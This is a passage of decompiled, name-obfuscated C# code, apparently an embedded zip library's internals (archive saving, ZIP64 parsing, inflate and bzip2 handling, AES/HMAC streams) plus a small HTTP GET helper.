			eventArgs0_0.long_1 = long_0;
		}

		static void smethod_341(GClass1 gclass1_0)
		{
			try
			{
				bool flag = false;
				gclass1_0.bool_8 = false;
				gclass1_0.uint_1 = 0u;
				Class16.smethod_263(gclass1_0);
				if (gclass1_0.WriteStream == null)
				{
					throw new BadStateException("You haven't specified where to save the zip.");
				}
				if (gclass1_0.string_0 != null && gclass1_0.string_0.EndsWith(".exe") && !gclass1_0.bool_13)
				{
					throw new BadStateException("You specified an EXE for a plain zip file.");
				}
				if (!gclass1_0.bool_5)
				{
					Class16.smethod_491(gclass1_0);
					if (gclass1_0.textWriter_0 != null)
					{
						gclass1_0.textWriter_0.WriteLine("No save is necessary....");
					}
				}
				else
				{
					gclass1_0.method_0(true);
					if (gclass1_0.textWriter_0 != null)
					{
						gclass1_0.textWriter_0.WriteLine("saving....");
					}
					if (gclass1_0.dictionary_0.Count >= 65535 && gclass1_0.enum8_0 == Enum8.const_0)
					{
						throw new ZipException("The number of entries is 65535 or greater. Consider setting the UseZip64WhenSaving property on the ZipFile instance.");
					}
					int num = 0;
					ICollection<GClass0> collection = gclass1_0.SortEntriesBeforeSaving ? gclass1_0.EntriesSorted : gclass1_0.Entries;
					foreach (GClass0 current in collection)
					{
						Class16.smethod_420(num, gclass1_0, true, current);
						Class16.smethod_592(current, gclass1_0.WriteStream);
						if (gclass1_0.bool_8)
						{
							break;
						}
						num++;
						Class16.smethod_420(num, gclass1_0, false, current);
						if (gclass1_0.bool_8)
						{
							break;
						}
						if (!current.bool_9)
						{
							bool arg_14A_0 = flag;
							bool? nullable_ = current.nullable_2;
							flag = (arg_14A_0 | nullable_.Value);
						}
					}
					if (!gclass1_0.bool_8)
					{
						ZipSegmentedStream zipSegmentedStream = gclass1_0.WriteStream as ZipSegmentedStream;
						gclass1_0.uint_1 = ((zipSegmentedStream != null) ? zipSegmentedStream.uint_0 : 1u);
						Stream writeStream = gclass1_0.WriteStream;
						uint uint_ = gclass1_0.uint_1;
						Enum8 enum8_ = gclass1_0.enum8_0;
						string string_ = gclass1_0.string_2;
						Class8 class8_ = new Class8(gclass1_0);
						bool flag2 = Class16.smethod_173(string_, collection, class8_, writeStream, uint_, enum8_);
						Class16.smethod_308(gclass1_0, Enum6.const_12);
						gclass1_0.bool_6 = true;
						gclass1_0.bool_5 = false;
						flag |= flag2;
						gclass1_0.nullable_0 = new bool?(flag);
						if (gclass1_0.string_0 != null && (gclass1_0.string_4 != null || zipSegmentedStream != null))
						{
							gclass1_0.WriteStream.Dispose();
							if (gclass1_0.bool_8)
							{
								return;
							}
							if (gclass1_0.bool_4 && gclass1_0.stream_0 != null)
							{
								gclass1_0.stream_0.Close();
								gclass1_0.stream_0 = null;
								foreach (GClass0 current2 in collection)
								{
									ZipSegmentedStream zipSegmentedStream2 = current2.stream_0 as ZipSegmentedStream;
									if (zipSegmentedStream2 != null)
									{
										zipSegmentedStream2.Dispose();
									}
									current2.stream_0 = null;
								}
							}
							string text = null;
							if (File.Exists(gclass1_0.string_0))
							{
								text = gclass1_0.string_0 + "." + Path.GetRandomFileName();
								if (File.Exists(text))
								{
									Class16.smethod_666(text, gclass1_0);
								}
								File.Move(gclass1_0.string_0, text);
							}
							Class16.smethod_308(gclass1_0, Enum6.const_13);
							File.Move((zipSegmentedStream != null) ? zipSegmentedStream.string_3 : gclass1_0.string_4, gclass1_0.string_0);
							Class16.smethod_308(gclass1_0, Enum6.const_14);
							if (text != null)
							{
								try
								{
									if (File.Exists(text))
									{
										File.Delete(text);
									}
								}
								catch
								{
								}
							}
							gclass1_0.bool_4 = true;
						}
						Class16.smethod_585(collection);
						Class16.smethod_491(gclass1_0);
						gclass1_0.bool_11 = true;
					}
				}
			}
			finally
			{
				Class16.smethod_391(gclass1_0);
			}
		}

		static string smethod_342(Class14 class14_0)
		{
			string text = "";
			if ((class14_0.fileAttributes_0 & FileAttributes.Hidden) != (FileAttributes)0)
			{
				text += "H";
			}
			if ((class14_0.fileAttributes_0 & FileAttributes.System) != (FileAttributes)0)
			{
				text += "S";
			}
			if ((class14_0.fileAttributes_0 & FileAttributes.ReadOnly) != (FileAttributes)0)
			{
				text += "R";
			}
			if ((class14_0.fileAttributes_0 & FileAttributes.Archive) != (FileAttributes)0)
			{
				text += "A";
			}
			if ((class14_0.fileAttributes_0 & FileAttributes.ReparsePoint) != (FileAttributes)0)
			{
				text += "L";
			}
			if ((class14_0.fileAttributes_0 & FileAttributes.NotContentIndexed) != (FileAttributes)0)
			{
				text += "I";
			}
			return text;
		}

		static void smethod_343(GClass0 gclass0_0, Stream stream_0, Stream4 stream4_0, Stream stream_1, Stream stream_2, Stream13 stream13_0)
		{
			if (stream13_0 == null)
			{
				return;
			}
			stream13_0.Close();
			if (stream_2 is Stream9)
			{
				stream_2.Close();
			}
			else if (stream_2 is Stream7)
			{
				stream_2.Close();
			}
			else if (stream_2 is Stream8)
			{
				stream_2.Close();
			}
			else if (stream_2 is Stream11)
			{
				stream_2.Close();
			}
			stream_1.Flush();
			stream_1.Close();
			gclass0_0.int_4 = 0;
			gclass0_0.long_2 = Class16.smethod_22(stream13_0);
			Stream3 stream = stream_1 as Stream3;
			if (stream != null && gclass0_0.long_2 > 0L)
			{
				stream_0.Write(Class16.smethod_495(stream), 0, 10);
				gclass0_0.int_4 += 10;
			}
			gclass0_0.long_1 = stream4_0.long_0;
			gclass0_0.long_0 = gclass0_0.long_1;
			gclass0_0.int_2 = Class16.smethod_4(stream13_0);
			Class16.smethod_323(gclass0_0);
		}

		static ArrayList smethod_344(Class64 class64_0)
		{
			return class64_0.arrayList_0;
		}

		static int smethod_345(Class44 class44_0)
		{
			GClass2 arg_1C_0 = class44_0.gclass2_0;
			class44_0.gclass2_0.long_1 = 0L;
			arg_1C_0.long_0 = 0L;
			class44_0.gclass2_0.string_0 = null;
			class44_0.enum17_0 = (class44_0.bool_0 ? Class44.Enum17.const_0 : Class44.Enum17.const_7);
			Class16.smethod_193(class44_0.class41_0);
			return 0;
		}

		static void smethod_346(int int_0, Stream9 stream9_0)
		{
			if (stream9_0.bool_0)
			{
				throw new ObjectDisposedException("DeflateStream");
			}
			if (stream9_0.stream12_0.byte_0 != null)
			{
				throw new GException0("The working buffer is already set.");
			}
			if (int_0 < 1024)
			{
				throw new GException0(string.Format("Don't be silly. {0} bytes?? Use a bigger buffer, at least {1}.", int_0, 1024));
			}
			stream9_0.stream12_0.int_0 = int_0;
		}

		static EventArgs1 smethod_347(string string_0)
		{
			return new EventArgs1(string_0, Enum6.const_3);
		}

		static int smethod_348(Stream3 stream3_0, byte[] byte_0, int int_0, int int_1)
		{
			if (stream3_0.bool_0)
			{
				throw new NotSupportedException();
			}
			int num = int_1 - int_0;
			int num2 = (num > 16) ? 16 : num;
			Array.Copy(BitConverter.GetBytes(stream3_0.int_0++), 0, stream3_0.byte_0, 0, 4);
			if (num2 == num && stream3_0.long_0 > 0L && stream3_0.long_1 + (long)int_1 == stream3_0.long_0)
			{
				stream3_0.hmacsha1_0.TransformFinalBlock(byte_0, int_0, num2);
				stream3_0.byte_1 = stream3_0.icryptoTransform_0.TransformFinalBlock(stream3_0.byte_0, 0, 16);
				stream3_0.bool_0 = true;
			}
			else
			{
				stream3_0.hmacsha1_0.TransformBlock(byte_0, int_0, num2, null, 0);
				stream3_0.icryptoTransform_0.TransformBlock(stream3_0.byte_0, 0, 16, stream3_0.byte_1, 0);
			}
			Class16.smethod_312(stream3_0, byte_0, int_0, num2);
			return num2;
		}

		static void smethod_349(Stream stream_0)
		{
			uint num = (uint)Class16.smethod_89(stream_0);
			if (num != 808471376u)
			{
				stream_0.Seek(-4L, SeekOrigin.Current);
			}
		}

		static Class53 smethod_350(Class54 class54_0)
		{
			return class54_0.class53_0;
		}

		static Socket smethod_351(Class58 class58_0)
		{
			return class58_0.socket_0;
		}

		static int smethod_352(byte[] byte_0, Class44 class44_0)
		{
			int int_ = 0;
			int num = byte_0.Length;
			if (class44_0.enum17_0 != Class44.Enum17.const_6)
			{
				throw new GException0("Stream error.");
			}
			if (Class16.smethod_62(1u, byte_0, 0, byte_0.Length) != class44_0.gclass2_0.uint_0)
			{
				return -3;
			}
			class44_0.gclass2_0.uint_0 = Class16.smethod_62(0u, null, 0, 0);
			if (num >= 1 << class44_0.int_2)
			{
				num = (1 << class44_0.int_2) - 1;
				int_ = byte_0.Length - num;
			}
			Class16.smethod_605(class44_0.class41_0, byte_0, int_, num);
			class44_0.enum17_0 = Class44.Enum17.const_7;
			return 0;
		}

		static void smethod_353(Stream6 stream6_0)
		{
			bool[] bool_ = stream6_0.class35_0.bool_0;
			byte[] byte_ = stream6_0.class35_0.byte_0;
			int int_ = 0;
			for (int i = 0; i < 256; i++)
			{
				if (bool_[i])
				{
					byte_[int_++] = (byte)i;
				}
			}
			stream6_0.int_5 = int_;
		}

		static void smethod_354(string string_0, out Stream stream_0, out string string_1)
		{
			for (int i = 0; i < 3; i++)
			{
				try
				{
					string_1 = Path.Combine(string_0, Class16.smethod_116());
					stream_0 = new FileStream(string_1, FileMode.CreateNew);
					return;
				}
				catch (IOException)
				{
					if (i == 2)
					{
						throw;
					}
				}
			}
			throw new IOException();
		}

		static void smethod_355(Stream stream_0, GClass0 gclass0_0)
		{
			if (gclass0_0.LengthOfHeader == 0)
			{
				throw new BadStateException("Bad header length.");
			}
			if (gclass0_0.bool_6 || gclass0_0.ArchiveStream is ZipSegmentedStream || stream_0 is ZipSegmentedStream || (gclass0_0.bool_10 && Class16.smethod_429(gclass0_0.class8_0) == Enum8.const_0) || (!gclass0_0.bool_10 && Class16.smethod_429(gclass0_0.class8_0) == Enum8.const_3))
			{
				Class16.smethod_332(stream_0, gclass0_0);
			}
			else
			{
				Class16.smethod_123(gclass0_0, stream_0);
			}
			gclass0_0.nullable_1 = new bool?(gclass0_0.long_0 >= (long)((ulong)-1) || gclass0_0.long_2 >= (long)((ulong)-1) || gclass0_0.long_4 >= (long)((ulong)-1));
			gclass0_0.nullable_2 = new bool?(Class16.smethod_103(gclass0_0.class8_0) == Enum8.const_3 || gclass0_0.nullable_1.Value);
		}

		static void smethod_356(GClass0 gclass0_0)
		{
			gclass0_0.int_5++;
			long position = gclass0_0.ArchiveStream.Position;
			gclass0_0.ArchiveStream.Seek(gclass0_0.long_4, SeekOrigin.Begin);
			byte[] array = new byte[30];
			gclass0_0.ArchiveStream.Read(array, 0, array.Length);
			byte[] arg_4D_0 = array;
			int expr_49 = 26;
			int arg_4C_0 = expr_49 + 1;
			int arg_5C_0 = arg_4D_0[expr_49];
			byte[] arg_55_0 = array;
			int expr_51 = 27;
			int arg_54_0 = expr_51 + 1;
			short num = (short)(arg_5C_0 + arg_55_0[expr_51] * 256);
			byte[] arg_66_0 = array;
			int expr_62 = 28;
			int arg_65_0 = expr_62 + 1;
			int arg_75_0 = arg_66_0[expr_62];
			byte[] arg_6E_0 = array;
			int expr_6A = 29;
			int arg_6D_0 = expr_6A + 1;
			short short_ = (short)(arg_75_0 + arg_6E_0[expr_6A] * 256);
			gclass0_0.ArchiveStream.Seek((long)num, SeekOrigin.Current);
			Class16.smethod_36(short_, gclass0_0, gclass0_0.ArchiveStream);
			gclass0_0.ArchiveStream.Seek(position, SeekOrigin.Begin);
			gclass0_0.int_5--;
		}

		static void smethod_357(Stream11 stream11_0, bool bool_0, bool bool_1)
		{
			if (stream11_0.bool_1)
			{
				return;
			}
			stream11_0.bool_1 = true;
			if (bool_0 || bool_1)
			{
				stream11_0.autoResetEvent_0.WaitOne();
			}
			do
			{
				int num = -1;
				int num2 = bool_0 ? 200 : (bool_1 ? -1 : 0);
				int num3 = -1;
				do
				{
					if (Monitor.TryEnter(stream11_0.queue_0, num2))
					{
						num3 = -1;
						try
						{
							if (stream11_0.queue_0.Count > 0)
							{
								num3 = stream11_0.queue_0.Dequeue();
							}
						}
						finally
						{
							Monitor.Exit(stream11_0.queue_0);
						}
						if (num3 >= 0)
						{
							Class46 @class = stream11_0.list_0[num3];
							if (@class.int_2 != stream11_0.int_6 + 1)
							{
								lock (stream11_0.queue_0)
								{
									stream11_0.queue_0.Enqueue(num3);
								}
								if (num == num3)
								{
									stream11_0.autoResetEvent_0.WaitOne();
									num = -1;
								}
								else if (num == -1)
								{
									num = num3;
								}
							}
							else
							{
								num = -1;
								stream11_0.stream_0.Write(@class.byte_1, 0, @class.int_4);
								GClass3 gclass3_ = stream11_0.gclass3_0;
								int int_ = @class.int_0;
								int int_2 = @class.int_3;
								Class16.smethod_233(int_2, gclass3_, int_);
								stream11_0.long_0 += (long)@class.int_3;
								@class.int_3 = 0;
								stream11_0.int_6 = @class.int_2;
								stream11_0.queue_1.Enqueue(@class.int_1);
								if (num2 == -1)
								{
									num2 = 0;
								}
							}
						}
					}
					else
					{
						num3 = -1;
					}
				}
				while (num3 >= 0);
				if (!bool_0)
				{
					break;
				}
			}
			while (stream11_0.int_6 != stream11_0.int_7);
			stream11_0.bool_1 = false;
		}

		static GClass0 smethod_358(string string_0)
		{
			return Class16.smethod_381(null, string_0, Enum0.const_0, null);
		}

		static void smethod_359(string string_0, Class14 class14_0)
		{
			class14_0.fileAttributes_0 = FileAttributes.Normal;
			string text = string_0.ToUpper();
			for (int i = 0; i < text.Length; i++)
			{
				char c = text[i];
				char c2 = c;
				if (c2 != 'A')
				{
					switch (c2)
					{
					case 'H':
						if ((class14_0.fileAttributes_0 & FileAttributes.Hidden) == (FileAttributes)0)
						{
							class14_0.fileAttributes_0 |= FileAttributes.Hidden;
							goto IL_122;
						}
						throw new ArgumentException(string.Format("Repeated flag. ({0})", c), "value");
					case 'I':
						if ((class14_0.fileAttributes_0 & FileAttributes.NotContentIndexed) == (FileAttributes)0)
						{
							class14_0.fileAttributes_0 |= FileAttributes.NotContentIndexed;
							goto IL_122;
						}
						throw new ArgumentException(string.Format("Repeated flag. ({0})", c), "value");
					case 'J':
					case 'K':
						break;
					case 'L':
						if ((class14_0.fileAttributes_0 & FileAttributes.ReparsePoint) == (FileAttributes)0)
						{
							class14_0.fileAttributes_0 |= FileAttributes.ReparsePoint;
							goto IL_122;
						}
						throw new ArgumentException(string.Format("Repeated flag. ({0})", c), "value");
					default:
						switch (c2)
						{
						case 'R':
							if ((class14_0.fileAttributes_0 & FileAttributes.ReadOnly) == (FileAttributes)0)
							{
								class14_0.fileAttributes_0 |= FileAttributes.ReadOnly;
								goto IL_122;
							}
							throw new ArgumentException(string.Format("Repeated flag. ({0})", c), "value");
						case 'S':
							if ((class14_0.fileAttributes_0 & FileAttributes.System) == (FileAttributes)0)
							{
								class14_0.fileAttributes_0 |= FileAttributes.System;
								goto IL_122;
							}
							throw new ArgumentException(string.Format("Repeated flag. ({0})", c), "value");
						}
						break;
					}
					throw new ArgumentException(string_0);
				}
				if ((class14_0.fileAttributes_0 & FileAttributes.Archive) != (FileAttributes)0)
				{
					throw new ArgumentException(string.Format("Repeated flag. ({0})", c), "value");
				}
				class14_0.fileAttributes_0 |= FileAttributes.Archive;
				IL_122:;
			}
		}

		static void smethod_360(GClass1 gclass1_0)
		{
			Stream readStream = gclass1_0.ReadStream;
			int num = Class16.smethod_456(readStream);
			int num2 = 0;
			byte[] array;
			if ((long)num == 101075792L)
			{
				array = new byte[52];
				readStream.Read(array, 0, array.Length);
				long num3 = BitConverter.ToInt64(array, 0);
				if (num3 < 44L)
				{
					throw new ZipException("Bad size in the ZIP64 Central Directory.");
				}
				gclass1_0.ushort_0 = BitConverter.ToUInt16(array, num2);
				num2 += 2;
				gclass1_0.ushort_1 = BitConverter.ToUInt16(array, num2);
				num2 += 2;
				gclass1_0.uint_0 = BitConverter.ToUInt32(array, num2);
				num2 += 2;
				array = new byte[num3 - 44L];
				readStream.Read(array, 0, array.Length);
				num = Class16.smethod_456(readStream);
				if ((long)num != 117853008L)
				{
					throw new ZipException("Inconsistent metadata in the ZIP64 Central Directory.");
				}
				array = new byte[16];
				readStream.Read(array, 0, array.Length);
				num = Class16.smethod_456(readStream);
			}
			if ((long)num != 101010256L)
			{
				readStream.Seek(-4L, SeekOrigin.Current);
				throw new BadReadException(string.Format("Bad signature ({0:X8}) at position 0x{1:X8}", num, readStream.Position));
			}
			array = new byte[16];
			gclass1_0.ReadStream.Read(array, 0, array.Length);
			if (gclass1_0.uint_0 == 0u)
			{
				gclass1_0.uint_0 = (uint)BitConverter.ToUInt16(array, 2);
			}
			Class16.smethod_450(gclass1_0);
		}

		static void smethod_361(Class3 class3_0)
		{
			string str = Class16.smethod_335();
			string str2 = Class16.smethod_114();
			string str3 = Class16.smethod_398();
			class3_0.string_0 = str + str2;
			class3_0.string_1 = class3_0.string_0 + str3;
		}

		static int smethod_362(Class44 class44_0, Enum19 enum19_0)
		{
			if (class44_0.gclass2_0.byte_0 == null)
			{
				throw new GException0("InputBuffer is null. ");
			}
			int num = 0;
			int num2 = -5;
			while (true)
			{
				switch (class44_0.enum17_0)
				{
				case Class44.Enum17.const_0:
					if (class44_0.gclass2_0.int_1 == 0)
					{
						return num2;
					}
					num2 = num;
					class44_0.gclass2_0.int_1--;
					class44_0.gclass2_0.long_0 += 1L;
					if (((class44_0.int_0 = (int)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++]) & 15) != 8)
					{
						class44_0.enum17_0 = Class44.Enum17.const_13;
						class44_0.gclass2_0.string_0 = string.Format("unknown compression method (0x{0:X2})", class44_0.int_0);
						class44_0.int_1 = 5;
						continue;
					}
					if ((class44_0.int_0 >> 4) + 8 > class44_0.int_2)
					{
						class44_0.enum17_0 = Class44.Enum17.const_13;
						class44_0.gclass2_0.string_0 = string.Format("invalid window size ({0})", (class44_0.int_0 >> 4) + 8);
						class44_0.int_1 = 5;
						continue;
					}
					class44_0.enum17_0 = Class44.Enum17.const_1;
					continue;
				case Class44.Enum17.const_1:
				{
					if (class44_0.gclass2_0.int_1 == 0)
					{
						return num2;
					}
					num2 = num;
					class44_0.gclass2_0.int_1--;
					class44_0.gclass2_0.long_0 += 1L;
					int num3 = (int)(class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] & 255);
					if (((class44_0.int_0 << 8) + num3) % 31 != 0)
					{
						class44_0.enum17_0 = Class44.Enum17.const_13;
						class44_0.gclass2_0.string_0 = "incorrect header check";
						class44_0.int_1 = 5;
						continue;
					}
					class44_0.enum17_0 = (((num3 & 32) == 0) ? Class44.Enum17.const_7 : Class44.Enum17.const_2);
					continue;
				}
				case Class44.Enum17.const_2:
					if (class44_0.gclass2_0.int_1 != 0)
					{
						num2 = num;
						class44_0.gclass2_0.int_1--;
						class44_0.gclass2_0.long_0 += 1L;
						class44_0.uint_1 = (uint)((long)((long)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] << 24) & (long)((ulong)-16777216));
						class44_0.enum17_0 = Class44.Enum17.const_3;
						continue;
					}
					return num2;
				case Class44.Enum17.const_3:
					if (class44_0.gclass2_0.int_1 != 0)
					{
						num2 = num;
						class44_0.gclass2_0.int_1--;
						class44_0.gclass2_0.long_0 += 1L;
						class44_0.uint_1 += (uint)((int)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] << 16 & 16711680);
						class44_0.enum17_0 = Class44.Enum17.const_4;
						continue;
					}
					return num2;
				case Class44.Enum17.const_4:
					if (class44_0.gclass2_0.int_1 != 0)
					{
						num2 = num;
						class44_0.gclass2_0.int_1--;
						class44_0.gclass2_0.long_0 += 1L;
						class44_0.uint_1 += (uint)((int)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] << 8 & 65280);
						class44_0.enum17_0 = Class44.Enum17.const_5;
						continue;
					}
					return num2;
				case Class44.Enum17.const_5:
					goto IL_60B;
				case Class44.Enum17.const_6:
					goto IL_694;
				case Class44.Enum17.const_7:
					num2 = Class16.smethod_412(class44_0.class41_0, num2);
					if (num2 == -3)
					{
						class44_0.enum17_0 = Class44.Enum17.const_13;
						class44_0.int_1 = 0;
						continue;
					}
					if (num2 == 0)
					{
						num2 = num;
					}
					if (num2 != 1)
					{
						return num2;
					}
					num2 = num;
					class44_0.uint_0 = Class16.smethod_193(class44_0.class41_0);
					if (class44_0.bool_0)
					{
						class44_0.enum17_0 = Class44.Enum17.const_8;
						continue;
					}
					goto IL_6B8;
				case Class44.Enum17.const_8:
					if (class44_0.gclass2_0.int_1 != 0)
					{
						num2 = num;
						class44_0.gclass2_0.int_1--;
						class44_0.gclass2_0.long_0 += 1L;
						class44_0.uint_1 = (uint)((long)((long)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] << 24) & (long)((ulong)-16777216));
						class44_0.enum17_0 = Class44.Enum17.const_9;
						continue;
					}
					return num2;
				case Class44.Enum17.const_9:
					if (class44_0.gclass2_0.int_1 != 0)
					{
						num2 = num;
						class44_0.gclass2_0.int_1--;
						class44_0.gclass2_0.long_0 += 1L;
						class44_0.uint_1 += (uint)((int)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] << 16 & 16711680);
						class44_0.enum17_0 = Class44.Enum17.const_10;
						continue;
					}
					return num2;
				case Class44.Enum17.const_10:
					if (class44_0.gclass2_0.int_1 != 0)
					{
						num2 = num;
						class44_0.gclass2_0.int_1--;
						class44_0.gclass2_0.long_0 += 1L;
						class44_0.uint_1 += (uint)((int)class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] << 8 & 65280);
						class44_0.enum17_0 = Class44.Enum17.const_11;
						continue;
					}
					return num2;
				case Class44.Enum17.const_11:
					if (class44_0.gclass2_0.int_1 == 0)
					{
						return num2;
					}
					num2 = num;
					class44_0.gclass2_0.int_1--;
					class44_0.gclass2_0.long_0 += 1L;
					class44_0.uint_1 += (uint)(class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] & 255);
					if (class44_0.uint_0 != class44_0.uint_1)
					{
						class44_0.enum17_0 = Class44.Enum17.const_13;
						class44_0.gclass2_0.string_0 = "incorrect data check";
						class44_0.int_1 = 5;
						continue;
					}
					goto IL_6CA;
				case Class44.Enum17.const_12:
					return 1;
				case Class44.Enum17.const_13:
					goto IL_6D4;
				}
				goto Block_20;
			}
			return num2;
			Block_20:
			throw new GException0("Stream error.");
			IL_60B:
			if (class44_0.gclass2_0.int_1 == 0)
			{
				return num2;
			}
			class44_0.gclass2_0.int_1--;
			class44_0.gclass2_0.long_0 += 1L;
			class44_0.uint_1 += (uint)(class44_0.gclass2_0.byte_0[class44_0.gclass2_0.int_0++] & 255);
			class44_0.gclass2_0.uint_0 = class44_0.uint_1;
			class44_0.enum17_0 = Class44.Enum17.const_6;
			return 2;
			IL_694:
			class44_0.enum17_0 = Class44.Enum17.const_13;
			class44_0.gclass2_0.string_0 = "need dictionary";
			class44_0.int_1 = 0;
			return -2;
			IL_6B8:
			class44_0.enum17_0 = Class44.Enum17.const_12;
			return 1;
			IL_6CA:
			class44_0.enum17_0 = Class44.Enum17.const_12;
			return 1;
			IL_6D4:
			throw new GException0(string.Format("Bad state ({0})", class44_0.gclass2_0.string_0));
		}

		static byte[] smethod_363(Class20 class20_0)
		{
			if (!class20_0.bool_0)
			{
				Class16.smethod_88(class20_0);
			}
			return class20_0.byte_2;
		}

		static Class20 smethod_364(string string_0, int int_0)
		{
			Class20 @class = new Class20(string_0, int_0);
			int num = @class.int_0 / 8 / 2;
			@class.byte_0 = new byte[num];
			Random random = new Random();
			random.NextBytes(@class.byte_0);
			return @class;
		}

		static int smethod_365(Class33 class33_0, byte byte_0)
		{
			if (class33_0.int_1 == -1)
			{
				class33_0.int_1 = (int)byte_0;
				class33_0.int_2++;
				return 1;
			}
			if (class33_0.int_1 == (int)byte_0)
			{
				if (++class33_0.int_2 <= 254)
				{
					return 1;
				}
				bool flag = Class16.smethod_408(class33_0, false);
				class33_0.int_1 = -1;
				class33_0.int_2 = 0;
				if (!flag)
				{
					return 1;
				}
				return 2;
			}
			else
			{
				if (Class16.smethod_408(class33_0, false))
				{
					class33_0.int_1 = -1;
					class33_0.int_2 = 0;
					return 0;
				}
				class33_0.int_2 = 1;
				class33_0.int_1 = (int)byte_0;
				return 1;
			}
		}

		static void smethod_366(bool bool_0, GClass1 gclass1_0, string string_0, string string_1)
		{
			Class16.smethod_505(string_1, bool_0, gclass1_0, string_0, null);
		}

		static void smethod_367()
		{
			try
			{
				if (Environment.OSVersion.Platform == PlatformID.Win32NT)
				{
					MemoryManager.memoryManager_0 = new MemoryManager();
				}
			}
			catch
			{
			}
		}

		static void smethod_368(string string_0, Class60 class60_0)
		{
			if (string_0 == null)
			{
				throw new ArgumentNullException();
			}
			class60_0.string_0 = string_0;
		}

		static string smethod_369(Class84 class84_0, string string_0)
		{
			string result;
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
				httpWebRequest.Proxy = new Class82(class84_0, true);
				httpWebRequest.KeepAlive = false;
				httpWebRequest.Method = "GET";
				httpWebRequest.Timeout = 180000;
				string text2;
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding("utf-8")))
					{
						string text = streamReader.ReadToEnd();
						text2 = text;
					}
				}
				result = text2;
			}
			catch
			{
				result = "error";
			}
			return result;
		}

		static int smethod_370(Class74.Class77 class77_0)
		{
			return class77_0.int_1;
		}

		static void smethod_371(Class39 class39_0, int int_0, int int_1)
		{
			if (class39_0.int_51 > Class39.int_13 - int_1)
			{
				class39_0.short_6 |= (short)(int_0 << class39_0.int_51 & 65535);
				class39_0.byte_0[class39_0.int_21++] = (byte)class39_0.short_6;
				class39_0.byte_0[class39_0.int_21++] = (byte)(class39_0.short_6 >> 8);
				class39_0.short_6 = (short)((uint)int_0 >> Class39.int_13 - class39_0.int_51);
				class39_0.int_51 += int_1 - Class39.int_13;
				return;
			}
			class39_0.short_6 |= (short)(int_0 << class39_0.int_51 & 65535);
			class39_0.int_51 += int_1;
		}

		static byte smethod_372(byte byte_0)
		{
			uint num = (uint)byte_0 * 131586u;
			uint num2 = num & 17055760u;
			uint num3 = num << 2 & 17055760u << 1;
			return (byte)(16781313u * (num2 + num3) >> 24);
		}

		static int smethod_373(Class8 class8_0)
		{
			if (class8_0.gclass1_0 != null)
			{
				return class8_0.gclass1_0.CodecBufferSize;
			}
			if (class8_0.stream1_0 != null)
			{
				return class8_0.stream1_0.method_0();
			}
			return class8_0.stream0_0.method_0();
		}

		static string smethod_374(Class54 class54_0)
		{
			return class54_0.string_1;
		}

		static string smethod_375(Enum enum_0)
		{
			FieldInfo field = enum_0.GetType().GetField(enum_0.ToString());
			DescriptionAttribute[] array = (DescriptionAttribute[])field.GetCustomAttributes(typeof(DescriptionAttribute), false);
			if (array.Length > 0)
			{
				return array[0].Description;
			}
			return enum_0.ToString();
		}

		static void smethod_376(Stream8 stream8_0)
		{
			byte[] array = new byte[]
			{
				66,
				90,
				104,
				0
			};
			array[3] = (byte)(48 + stream8_0.int_6);
			byte[] array2 = array;
			stream8_0.stream_0.Write(array2, 0, array2.Length);
		}

		static void smethod_377(Class22 class22_0, string string_0)
		{
			byte[] array = Class16.smethod_659(string_0);
			for (int i = 0; i < string_0.Length; i++)
			{
				Class16.smethod_599(class22_0, array[i]);
			}
		}

		static void smethod_378(Stream stream_0, GClass0 gclass0_0)
		{
			Stream4 stream = stream_0 as Stream4;
			if (gclass0_0.long_2 == 0L && gclass0_0.long_0 == 0L)
			{
				if (gclass0_0.enum0_0 == Enum0.const_6)
				{
					return;
				}
				if (gclass0_0.string_3 != null)
				{
					int num = 0;
					if (gclass0_0.enum2_0 == Enum2.const_1)
					{
						num = 12;
					}
					else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
					{
						num = gclass0_0.class20_1.byte_0.Length + Class16.smethod_363(gclass0_0.class20_1).Length;
					}
					if (gclass0_0.enum0_0 == Enum0.const_6 && !stream_0.CanSeek)
					{
						throw new ZipException("Zero bytes written, encryption in use, and non-seekable output.");
					}
					if (gclass0_0.enum2_0 != Enum2.const_0)
					{
						stream_0.Seek((long)(-1 * num), SeekOrigin.Current);
						stream_0.SetLength(stream_0.Position);
						if (stream != null)
						{
							Class16.smethod_6((long)num, stream);
						}
						gclass0_0.int_3 -= num;
						gclass0_0.long_3 -= (long)num;
					}
					gclass0_0.string_3 = null;
					gclass0_0.short_7 &= -2;
					byte[] arg_107_0 = gclass0_0.byte_2;
					int expr_F6 = 6;
					int arg_F9_0 = expr_F6 + 1;
					arg_107_0[expr_F6] = (byte)(gclass0_0.short_7 & 255);
					byte[] arg_122_0 = gclass0_0.byte_2;
					int expr_10F = 7;
					int arg_112_0 = expr_10F + 1;
					arg_122_0[expr_10F] = (byte)(((int)gclass0_0.short_7 & 65280) >> 8);
					if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
					{
						short num2 = (short)((int)gclass0_0.byte_2[26] + (int)gclass0_0.byte_2[27] * 256);
						int int_ = (int)(30 + num2);
						int num3 = Class16.smethod_315(39169, int_, gclass0_0.byte_2);
						if (num3 >= 0)
						{
							gclass0_0.byte_2[num3++] = 153;
							gclass0_0.byte_2[num3++] = 153;
						}
					}
				}
				gclass0_0.CompressionMethod = CompressionMethod.None;
				gclass0_0.Encryption = Enum2.const_0;
			}
			else if (gclass0_0.class22_1 != null || gclass0_0.class20_1 != null)
			{
				if (gclass0_0.enum2_0 == Enum2.const_1)
				{
					gclass0_0.long_0 += 12L;
				}
				else if (gclass0_0.enum2_0 == Enum2.const_2 || gclass0_0.enum2_0 == Enum2.const_3)
				{
					gclass0_0.long_0 += (long)Class16.smethod_318(gclass0_0.class20_1);
				}
			}
			byte[] arg_215_0 = gclass0_0.byte_2;
